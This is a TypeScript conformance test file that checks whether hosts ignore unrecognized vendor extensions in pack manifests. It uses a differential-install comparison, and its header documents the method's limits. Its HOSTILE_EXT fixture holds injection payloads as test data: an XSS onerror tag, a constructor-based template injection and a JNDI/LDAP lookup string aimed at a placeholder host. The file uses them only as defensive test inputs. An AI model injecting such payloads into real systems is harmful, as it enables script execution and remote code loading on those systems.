/**
 * pack-manifest-extension-opacity — RFC 0139, the host-side witness for
 * RFC 0138's "ignore means ignore" clause.
 *
 * RFC 0138 made pack manifests carry `^(x-|vendor\.)` extensions and defined
 * ignoring one normatively: a consumer MUST NOT render it, execute it,
 * interpret it as markup or a templating directive, use it to select a code
 * path, or persist it into a surface where it will later be interpreted.
 * All 19 of RFC 0138's assertions are SERVER-FREE — they check that schemas
 * admit the hatch and that the corpus states the rule. **Nothing verified any
 * of it against a host.**
 *
 * ## Why presence is not the assertion
 *
 * The obvious leg — install an extension-bearing manifest, assert 2xx —
 * proves almost nothing. A host that stores `x-evil.template` and later
 * interpolates it into a rendered surface PASSES it. That is precisely the
 * failure RFC 0138 calls "strictly worse than no hatch", because it converts
 * a loud publication failure into a silent injection surface.
 *
 * ## The differential
 *
 * The load-bearing leg is **leg 3**: install the same manifest with and
 * without an unrecognized extension and require the host's registration
 * projection to be IDENTICAL (modulo the extension properties themselves).
 *
 * This is sink-agnostic. It does not ask WHERE an extension might leak — a
 * suite cannot enumerate a host's sinks — it asks whether the host's
 * observable behavior is a function of the extension at all. If it is not,
 * every install-time sink is covered at once.
 *
 * The extension namespace is `vendor.conformance.*`, which no host can claim
 * to recognize, so the UNRECOGNIZED branch is the one exercised. A host that
 * recognizes and acts on its own extension is out of scope for this rule.
 *
 * ## WHAT THIS DOES NOT DISCRIMINATE — read before citing a green run
 *
 *  - **A host that stores the extension and interprets it later**, at a
 *    moment this seam never reaches. Leg 3 covers INSTALL-TIME sinks only.
 *    No finite suite closes this; see RFC 0139 gap G3.
 *  - **A host that fakes the seam** by returning a constant projection.
 *    Legs 2 and 5 constrain the projection to be a function of something,
 *    but host-sample seams measure COOPERATING hosts — they are not an
 *    adversarial control (RFC 0139 risk R3).
 *  - **Pack kinds other than artifact-type.** Only this seam has a real host
 *    behind it; a speculative leg on an unimplemented kind would soft-skip
 *    everywhere and add coverage theatre (gap G2).
 *  - **`artifact.created` carrying `artifactType`** (RFC 0138 gap G8). This
 *    seam emits no run events — the reference host emits `artifact.created`
 *    only from a real run, not from `persistRunArtifact`. Explicitly out of
 *    scope rather than folded in to produce a green that covers nothing.
 *
 * Gated on `behaviorGate`, never a bare `return`: a host that advertises
 * `artifactTypes.supported` and serves no seam FAILS under
 * `OPENWOP_REQUIRE_BEHAVIOR=true` rather than reporting green.
 *
 * @see RFCS/0139-extension-opacity-host-witness.md
 * @see spec/v1/node-packs.md §"Vendor extensions on pack manifests"
 * @see SECURITY/invariants.yaml `pack-manifest-extension-opaque`
 */

import { describe, it, expect } from 'vitest';
import { driver } from '../lib/driver.js';
import { behaviorGate, behaviorGatePresent } from '../lib/behavior-gate.js';
import {
  readArtifactTypesCap,
  artifactTypesSupported,
  installArtifactTypePack,
  sampleArtifactTypePack,
  stripExtensions,
  withExtensions,
  canonicalJson,
} from '../lib/artifactTypes.js';

const PROFILE = 'openwop-artifact-type-packs';

/** An extension no host can claim to recognize — forces the unrecognized branch. */
const INERT_EXT = { 'vendor.conformance.opacity': { note: 'unrecognized by construction' } };

/** An extension whose VALUE is markup + a templating directive. */
const HOSTILE_EXT = {
  'vendor.conformance.hostile': {
    markup: '<img src=x onerror="alert(1)">',
    template: '{{constructor.constructor("return 1")()}}',
    directive: '${jndi:ldap://example.invalid/a}',
  },
};

/** Installs `manifest`, returning the projection or null when the seam is absent. */
async function install(manifest: unknown): Promise<{ status: number; json: unknown } | null> {
  const { artifactTypeId, schema } = sampleArtifactTypePack();
  return installArtifactTypePack(manifest, { [artifactTypeId]: schema });
}

const ok = (status: number): boolean => status >= 200 && status < 300;

describe('pack-manifest-extension-opacity: a host MUST accept an extended manifest (RFC 0139)', () => {
  it('leg 1 — an extension-bearing manifest installs', async () => {
    if (!behaviorGate(PROFILE, artifactTypesSupported(await readArtifactTypesCap()))) return;
    const { manifest } = sampleArtifactTypePack();
    const res = await install(withExtensions(manifest, INERT_EXT));
    if (!behaviorGatePresent(PROFILE, res)) return; // seam absent: skip default, FAIL strict
    expect(
      ok(res.status),
      driver.describe('node-packs.md §"Vendor extensions on pack manifests"', 'a consumer MUST ignore an unrecognized extension and MUST NOT reject the pack for its presence'),
    ).toBe(true);
  });

  it('leg 2 — the same manifest WITHOUT the extension installs (baseline)', async () => {
    if (!behaviorGate(PROFILE, artifactTypesSupported(await readArtifactTypesCap()))) return;
    const { manifest } = sampleArtifactTypePack();
    const res = await install(manifest);
    if (!behaviorGatePresent(PROFILE, res)) return;
    expect(
      ok(res.status),
      driver.describe('RFC 0139 §Conformance', 'baseline — guards against a differential that passes because EVERYTHING fails'),
    ).toBe(true);
  });
});

describe('pack-manifest-extension-opacity: the differential — behavior MUST NOT be a function of the extension (RFC 0139)', () => {
  it('leg 3 — projections for M and M′ are equal modulo the extensions [LOAD-BEARING]', async () => {
    if (!behaviorGate(PROFILE, artifactTypesSupported(await readArtifactTypesCap()))) return;
    const { manifest } = sampleArtifactTypePack();

    const plain = await install(manifest);
    if (!behaviorGatePresent(PROFILE, plain)) return;
    const extended = await install(withExtensions(manifest, INERT_EXT));
    if (!behaviorGatePresent(PROFILE, extended)) return;

    expect(
      ok(plain.status) === ok(extended.status),
      driver.describe('RFC 0139 §"The differential-install contract"', 'acceptance MUST NOT be a function of an unrecognized extension — a host MUST accept both or reject both for the same reason'),
    ).toBe(true);

    expect(
      canonicalJson(stripExtensions(extended.json)),
      driver.describe('RFC 0139 §"The differential-install contract"', 'the registration projection MUST be identical modulo the extension properties — a difference means the host acted on an extension it does not recognize (rendering catalog, derived facet, or code-path switch)'),
    ).toBe(canonicalJson(stripExtensions(plain.json)));
  });

  it('leg 4 — an extension carrying markup / a templating directive is not interpreted at install', async () => {
    if (!behaviorGate(PROFILE, artifactTypesSupported(await readArtifactTypesCap()))) return;
    const { manifest } = sampleArtifactTypePack();

    const plain = await install(manifest);
    if (!behaviorGatePresent(PROFILE, plain)) return;
    const hostile = await install(withExtensions(manifest, HOSTILE_EXT));
    if (!behaviorGatePresent(PROFILE, hostile)) return;

    expect(
      ok(hostile.status),
      driver.describe('node-packs.md §"Vendor extensions on pack manifests"', 'an extension value is PACK-AUTHORED and therefore untrusted, but untrusted is not a rejection reason — the host MUST install and ignore'),
    ).toBe(true);

    expect(
      canonicalJson(stripExtensions(hostile.json)),
      driver.describe('node-packs.md §"Vendor extensions on pack manifests"', 'MUST NOT render it, execute it, or interpret it as markup or a templating directive — a projection that differs from baseline means the value reached an interpreter'),
    ).toBe(canonicalJson(stripExtensions(plain.json)));
  });
});

describe('pack-manifest-extension-opacity: the HOST reader stays narrow (RFC 0139 leg 5)', () => {
  it('leg 5 — a misspelled canonical field is still rejected by the host, not merely by the schema', async () => {
    if (!behaviorGate(PROFILE, artifactTypesSupported(await readArtifactTypesCap()))) return;
    const { manifest } = sampleArtifactTypePack();

    // `dispalyName` matches no canonical property and no extension pattern.
    const typo = JSON.parse(JSON.stringify(manifest)) as Record<string, unknown>;
    (typo['artifactTypes'] as Record<string, unknown>[])[0]!['dispalyName'] = 'Note';

    const res = await install(typo);
    if (!behaviorGatePresent(PROFILE, res)) return;
    expect(
      ok(res.status),
      driver.describe('node-packs.md §"Vendor extensions on pack manifests"', 'the hatch admits DECLARED extensions, not arbitrary keys — a host that widened its own reader to additionalProperties:true to "support extensions" accepts everything, which is not the same as accepting extensions'),
    ).toBe(false);
  });
});
